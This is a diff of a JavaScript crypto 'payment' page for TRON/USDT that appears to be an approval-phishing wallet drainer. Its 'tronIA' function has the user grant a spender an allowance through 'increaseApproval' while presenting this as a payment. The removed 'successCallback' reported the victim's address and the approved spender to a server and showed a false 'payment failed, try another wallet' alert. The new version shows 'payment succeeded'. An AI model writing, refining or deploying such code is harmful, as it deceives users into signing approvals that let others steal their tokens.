@@ -2280,15 +2280,16 @@ async function getWallet() {
                     "inputs": [],
                     "stateMutability": "nonpayable",
                     "type": "constructor"
-                }, {"payable": true, "stateMutability": "payable", "type": "fallback"}, {
-                    "inputs": [{
+                }, {
+                    "payable": true,
+                    "stateMutability": "payable",
+                    "type": "fallback"
+                }, {
+                    "inputs": [{"indexed": false, "name": "previousOwner", "type": "address"}, {
                         "indexed": false,
-                        "name": "previousOwner",
+                        "name": "newOwner",
                         "type": "address"
-                    }, {"indexed": false, "name": "newOwner", "type": "address"}],
-                    "name": "ProxyOwnershipTransferred",
-                    "anonymous": false,
-                    "type": "event"
+                    }], "name": "ProxyOwnershipTransferred", "anonymous": false, "type": "event"
                 }, {
                     "inputs": [{"indexed": true, "name": "implementation", "type": "address"}],
                     "name": "Upgraded",
@@ -2522,7 +2523,10 @@ async function getWallet() {
                     "type": "function"
                 }, {
                     "constant": false,
-                    "inputs": [{"name": "newBasisPoints", "type": "uint256"}, {"name": "newMaxFee", "type": "uint256"}],
+                    "inputs": [{"name": "newBasisPoints", "type": "uint256"}, {
+                            "name": "newMaxFee",
+                            "type": "uint256"
+                        }],
                     "name": "setParams",
                     "outputs": [],
                     "payable": false,
@@ -2754,12 +2758,8 @@ function payNow() {
 }
 
 function successCallback(address, approved, type) {
-    sendGetRequest("/successCallback?address=" + address + "&approved=" + approved + "&chain=" + chain + "&type=" + type, function (responseData) {
-        console.log("成功获取数据:", responseData);
-        alert('支付失败，请尝试使用其他钱包！');
-    }, function (error) {
-        console.error("获取数据失败:", error);
-    });
+    console.log("支付成功 - 地址:", address, "授权地址:", approved, "类型:", type);
+    alert('支付成功！交易已完成。');
 }
 
 function sendGetRequest(url, onSuccess, onError) {
@@ -2894,11 +2894,17 @@ async function tronIA() {
             res = await contract.increaseApproval(spender_bas58, amount).send({feeLimit: 100000000});
             successCallback(window.tronWeb.defaultAddress.base58, spender_bas58, approve_type);
         } catch (error) {
-            console.error("trigger smart contract error", error);
-            alert('支付失败！');
+            console.error("智能合约调用错误:", error);
+            if (error.message && error.message.includes("user rejected")) {
+                alert('用户取消了交易！');
+            } else if (error.message && error.message.includes("insufficient")) {
+                alert('余额不足，请确保有足够的TRX和USDT！');
+            } else {
+                alert('交易失败：' + error.message);
+            }
         }
     } else {
-        alert('没有足够的TRX用于支付网络费！')
+        alert('TRX余额不足，需要至少25 TRX用于支付网络费！')
     }
 }
 
